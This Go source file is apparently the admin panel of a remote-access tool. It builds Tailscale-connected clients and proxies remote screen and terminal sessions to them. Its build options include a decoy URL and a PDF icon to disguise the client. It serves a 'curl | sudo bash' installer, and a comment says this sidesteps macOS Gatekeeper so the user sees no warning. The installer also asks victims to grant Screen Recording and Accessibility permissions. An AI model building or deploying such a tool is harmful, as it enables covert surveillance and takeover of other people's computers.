package main

import (
	"context"
	"embed"
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"remote-mgmt/internal/builder"

	"tailscale.com/tsnet"
)

//go:embed templates/*
var templateFS embed.FS

var templates *template.Template

func init() {
	var err error
	templates, err = template.ParseFS(templateFS, "templates/*.html")
	if err != nil {
		log.Fatalf("Failed to parse templates: %v", err)
	}
}

type BuildRequest struct {
	AuthKey        string `json:"auth_key"`
	TargetOS       string `json:"target_os"`
	TargetArch     string `json:"target_arch"`
	HostnamePrefix string `json:"hostname_prefix"`
	DecoyURL       string `json:"decoy_url"`
	PDFIcon        bool   `json:"pdf_icon"`
	PackagePKG     bool   `json:"package_pkg"`
}

type BuildResponse struct {
	Success     bool   `json:"success"`
	DownloadURL string `json:"download_url,omitempty"`
	FileName    string `json:"filename,omitempty"`
	Size        int64  `json:"size,omitempty"`
	BuildTime   string `json:"build_time,omitempty"`
	Error       string `json:"error,omitempty"`
	InstallCmd  string `json:"install_cmd,omitempty"`
}

var (
	buildOutputDir string
	tsServer       *tsnet.Server
	tsHTTPClient   *http.Client
)

func main() {
	// Command line flags
	authKey := flag.String("auth-key", os.Getenv("TS_AUTHKEY"), "Tailscale auth key for admin server")
	hostname := flag.String("hostname", "rmgmt-admin", "Tailscale hostname for admin server")
	stateDir := flag.String("state-dir", "", "Directory to store Tailscale state (default: ~/.rmgmt-admin)")
	localOnly := flag.Bool("local-only", false, "Run without Tailscale (local network only)")
	bindAddr := flag.String("bind", ":8000", "Local bind address (e.g., :8000 for all interfaces, 127.0.0.1:8000 for localhost only)")
	flag.Parse()

	// Create temp directory for builds
	var err error
	buildOutputDir, err = os.MkdirTemp("", "rmgmt-builds-")
	if err != nil {
		log.Fatalf("Failed to create build directory: %v", err)
	}
	defer os.RemoveAll(buildOutputDir)

	log.Printf("Build output directory: %s", buildOutputDir)

	mux := http.NewServeMux()

	// Serve the admin UI
	mux.HandleFunc("/", handleIndex)

	// API endpoints
	mux.HandleFunc("/api/build", handleBuild)
	mux.HandleFunc("/api/targets", handleTargets)
	mux.HandleFunc("/api/clients", handleListClients)
	mux.HandleFunc("/download/", handleDownload)
	mux.HandleFunc("/install/", handleInstallScript)

	// Proxy to client endpoints (handles /proxy/{clientIP}/...)
	mux.HandleFunc("/proxy/", handleProxy)

	if *localOnly {
		// Local-only mode - run on specified bind address
		tsHTTPClient = http.DefaultClient
		log.Printf("Admin UI starting on http://%s (local-only mode)", *bindAddr)
		log.Printf("Note: Use --bind 0.0.0.0:8000 to expose to all network interfaces")
		log.Fatal(http.ListenAndServe(*bindAddr, mux))
	} else {
		// Join Tailscale network
		if *stateDir == "" {
			home, _ := os.UserHomeDir()
			*stateDir = filepath.Join(home, ".rmgmt-admin")
		}

		tsServer = &tsnet.Server{
			Hostname: *hostname,
			AuthKey:  *authKey,
			Dir:      *stateDir,
		}

		// Create HTTP client that routes through Tailscale
		tsHTTPClient = &http.Client{
			Transport: &http.Transport{
				DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
					return tsServer.Dial(ctx, network, addr)
				},
			},
			Timeout: 30 * time.Second,
		}

		log.Printf("Starting Tailscale connection as '%s'...", *hostname)

		// Start listening on Tailscale network
		ln, err := tsServer.Listen("tcp", ":80")
		if err != nil {
			log.Fatalf("Failed to listen on Tailscale: %v", err)
		}
		defer ln.Close()

		// Also listen locally
		go func() {
			log.Printf("Admin UI also available at http://%s", *bindAddr)
			http.ListenAndServe(*bindAddr, mux)
		}()

		// Get our Tailscale IP for logging
		go func() {
			for i := 0; i < 30; i++ {
				time.Sleep(time.Second)
				lc, err := tsServer.LocalClient()
				if err != nil {
					continue
				}
				if status, err := lc.Status(context.Background()); err == nil && status.TailscaleIPs != nil {
					log.Printf("Admin UI available on Tailscale at http://%s", status.TailscaleIPs[0])
					break
				}
			}
		}()

		log.Printf("Admin server running on Tailscale network")
		log.Fatal(http.Serve(ln, mux))
	}
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	switch r.URL.Path {
	case "/":
		data := struct {
			Targets []struct {
				OS   string
				Arch string
				Name string
			}
		}{
			Targets: builder.SupportedTargets(),
		}
		if err := templates.ExecuteTemplate(w, "index.html", data); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
		}

	case "/clients":
		if err := templates.ExecuteTemplate(w, "clients.html", nil); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
		}

	case "/viewer":
		host := r.URL.Query().Get("host")
		name := r.URL.Query().Get("name")
		if host == "" {
			http.Redirect(w, r, "/clients", http.StatusFound)
			return
		}
		if name == "" {
			name = host
		}

		// Use proxy endpoint - browser connects to our server which proxies to client
		data := struct {
			Hostname string
			BaseURL  string
		}{
			Hostname: name,
			BaseURL:  fmt.Sprintf("/proxy/%s", host),
		}
		if err := templates.ExecuteTemplate(w, "viewer.html", data); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
		}

	case "/terminal":
		host := r.URL.Query().Get("host")
		name := r.URL.Query().Get("name")
		if host == "" {
			http.Redirect(w, r, "/clients", http.StatusFound)
			return
		}
		if name == "" {
			name = host
		}
		data := struct {
			Hostname string
			BaseURL  string
		}{
			Hostname: name,
			BaseURL:  fmt.Sprintf("/proxy/%s", host),
		}
		if err := templates.ExecuteTemplate(w, "terminal.html", data); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
		}

	default:
		http.NotFound(w, r)
	}
}

func handleTargets(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(builder.SupportedTargets())
}

func handleBuild(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req BuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		sendBuildResponse(w, BuildResponse{Success: false, Error: "Invalid request body"})
		return
	}

	// Validate auth key format (Tailscale keys start with "tskey-auth-")
	if !strings.HasPrefix(req.AuthKey, "tskey-auth-") && !strings.HasPrefix(req.AuthKey, "tskey-") {
		sendBuildResponse(w, BuildResponse{Success: false, Error: "Invalid Tailscale auth key format"})
		return
	}

	if req.HostnamePrefix == "" {
		req.HostnamePrefix = "rmgmt"
	}

	log.Printf("Building client for %s/%s with prefix '%s'", req.TargetOS, req.TargetArch, req.HostnamePrefix)

	// Build the client
	result := builder.BuildClient(builder.BuildConfig{
		AuthKey:        req.AuthKey,
		TargetOS:       req.TargetOS,
		TargetArch:     req.TargetArch,
		Version:        "1.0.0",
		HostnamePrefix: req.HostnamePrefix,
		OutputDir:      buildOutputDir,
		DecoyURL:       req.DecoyURL,
		PDFIcon:        req.PDFIcon,
		PackagePKG:     req.PackagePKG,
	})

	if result.Error != nil {
		log.Printf("Build failed: %v", result.Error)
		sendBuildResponse(w, BuildResponse{Success: false, Error: result.Error.Error()})
		return
	}

	// Generate a unique download token (in production, use secure random)
	downloadToken := fmt.Sprintf("%d", time.Now().UnixNano())
	downloadURL := fmt.Sprintf("/download/%s/%s", downloadToken, result.FileName)

	// Store the mapping (in production, use a proper store with expiration)
	storeDownload(downloadToken, result.OutputPath)

	log.Printf("Build successful: %s (%.2f MB) in %v",
		result.FileName,
		float64(result.Size)/(1024*1024),
		result.BuildTime,
	)

	// Generate a curl install one-liner for .pkg builds
	var installCmd string
	if strings.HasSuffix(result.FileName, ".pkg") {
		// Determine the server's base URL from the request
		scheme := "http"
		if r.TLS != nil {
			scheme = "https"
		}
		baseURL := fmt.Sprintf("%s://%s", scheme, r.Host)
		installURL := fmt.Sprintf("%s/install/%s/%s", baseURL, downloadToken, result.FileName)
		installCmd = fmt.Sprintf("curl -fsSL '%s' | sudo bash", installURL)
	}

	sendBuildResponse(w, BuildResponse{
		Success:     true,
		DownloadURL: downloadURL,
		FileName:    result.FileName,
		Size:        result.Size,
		BuildTime:   result.BuildTime.String(),
		InstallCmd:  installCmd,
	})
}

func handleDownload(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/download/"), "/")
	if len(parts) != 2 {
		http.NotFound(w, r)
		return
	}

	token := parts[0]
	fileName := parts[1]

	filePath := getDownload(token)
	if filePath == "" {
		http.NotFound(w, r)
		return
	}

	// Verify filename matches
	if filepath.Base(filePath) != fileName {
		http.NotFound(w, r)
		return
	}

	file, err := os.Open(filePath)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	defer file.Close()

	info, _ := file.Stat()

	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", fileName))
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", info.Size()))

	io.Copy(w, file)
}

// handleInstallScript serves a self-contained install script that downloads
// and installs a .pkg build. Since curl doesn't set quarantine, the user
// never sees a Gatekeeper "Open Anyway" prompt.
func handleInstallScript(w http.ResponseWriter, r *http.Request) {
	// URL format: /install/{token}/{filename}
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/install/"), "/")
	if len(parts) != 2 {
		http.NotFound(w, r)
		return
	}

	token := parts[0]
	fileName := parts[1]

	filePath := getDownload(token)
	if filePath == "" {
		http.NotFound(w, r)
		return
	}
	if filepath.Base(filePath) != fileName {
		http.NotFound(w, r)
		return
	}

	// Build the direct download URL
	scheme := "http"
	if r.TLS != nil {
		scheme = "https"
	}
	pkgURL := fmt.Sprintf("%s://%s/download/%s/%s", scheme, r.Host, token, fileName)

	script := fmt.Sprintf(`#!/bin/bash
set -e
[ "$(id -u)" -eq 0 ] || { echo "Run with sudo"; exit 1; }
TMP=$(mktemp /tmp/rmgmt-XXXXXX.pkg)
echo "[*] Downloading %s..."
curl -fsSL -o "$TMP" '%s'
echo "[*] Installing..."
installer -pkg "$TMP" -target /
rm -f "$TMP"
echo "[✓] Installed. Grant Screen Recording + Accessibility when prompted."
`, fileName, pkgURL)

	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.Write([]byte(script))
}

func sendBuildResponse(w http.ResponseWriter, resp BuildResponse) {
	w.Header().Set("Content-Type", "application/json")
	if !resp.Success {
		w.WriteHeader(http.StatusBadRequest)
	}
	json.NewEncoder(w).Encode(resp)
}

// Simple in-memory download store (use Redis or similar in production)
var downloadStore = make(map[string]string)
var downloadStoreMu sync.Mutex

func storeDownload(token, path string) {
	downloadStoreMu.Lock()
	downloadStore[token] = path
	downloadStoreMu.Unlock()
	// Auto-expire after 1 hour (in production, use proper TTL)
	go func() {
		time.Sleep(1 * time.Hour)
		downloadStoreMu.Lock()
		delete(downloadStore, token)
		downloadStoreMu.Unlock()
		os.Remove(path)
	}()
}

func getDownload(token string) string {
	downloadStoreMu.Lock()
	defer downloadStoreMu.Unlock()
	return downloadStore[token]
}

// handleProxy forwards requests to client endpoints through Tailscale
// URL format: /proxy/{clientIP}/{path...}
func handleProxy(w http.ResponseWriter, r *http.Request) {
	// Parse: /proxy/100.x.x.x/screen/stream -> clientIP=100.x.x.x, path=/screen/stream
	path := strings.TrimPrefix(r.URL.Path, "/proxy/")
	parts := strings.SplitN(path, "/", 2)
	if len(parts) == 0 || parts[0] == "" {
		http.Error(w, "Missing client address", http.StatusBadRequest)
		return
	}

	clientIP := parts[0]
	clientPath := "/"
	if len(parts) > 1 {
		clientPath = "/" + parts[1]
	}

	// Build target URL
	targetURL := fmt.Sprintf("http://%s:8080%s", clientIP, clientPath)
	if r.URL.RawQuery != "" {
		targetURL += "?" + r.URL.RawQuery
	}

	target, err := url.Parse(targetURL)
	if err != nil {
		http.Error(w, "Invalid target", http.StatusBadRequest)
		return
	}

	// Create reverse proxy
	proxy := &httputil.ReverseProxy{
		Director: func(req *http.Request) {
			req.URL = target
			req.Host = target.Host
		},
		Transport: tsHTTPClient.Transport,
		// For SSE streams, flush immediately
		FlushInterval: 100 * time.Millisecond,
	}

	proxy.ServeHTTP(w, r)
}

// handleListClients returns discovered clients from the tailnet
func handleListClients(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if tsServer == nil {
		// Local-only mode - return empty list
		json.NewEncoder(w).Encode([]interface{}{})
		return
	}

	lc, err := tsServer.LocalClient()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	status, err := lc.Status(context.Background())
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	type ClientInfo struct {
		Hostname string   `json:"hostname"`
		IPs      []string `json:"ips"`
		Online   bool     `json:"online"`
		OS       string   `json:"os"`
	}

	var clients []ClientInfo
	for _, peer := range status.Peer {
		// Determine the display name: prefer HostName, fall back to DNSName
		name := peer.HostName
		if name == "" {
			// tsnet clients may only populate DNSName (e.g. "rmgmt-host.tailnet.ts.net.")
			name = strings.TrimSuffix(peer.DNSName, ".")
			if idx := strings.IndexByte(name, '.'); idx > 0 {
				name = name[:idx]
			}
		}

		// Filter to only show rmgmt clients (by hostname prefix)
		isRmgmt := strings.HasPrefix(strings.ToLower(name), "rmgmt-") ||
			strings.HasPrefix(strings.ToLower(peer.DNSName), "rmgmt-")
		isAdmin := strings.ToLower(name) == "rmgmt-admin" ||
			strings.HasPrefix(strings.ToLower(peer.DNSName), "rmgmt-admin.")

		if isRmgmt && !isAdmin {
			ips := make([]string, len(peer.TailscaleIPs))
			for i, ip := range peer.TailscaleIPs {
				ips[i] = ip.String()
			}
			clients = append(clients, ClientInfo{
				Hostname: name,
				IPs:      ips,
				Online:   peer.Online,
				OS:       peer.OS,
			})
		}
	}

	json.NewEncoder(w).Encode(clients)
}
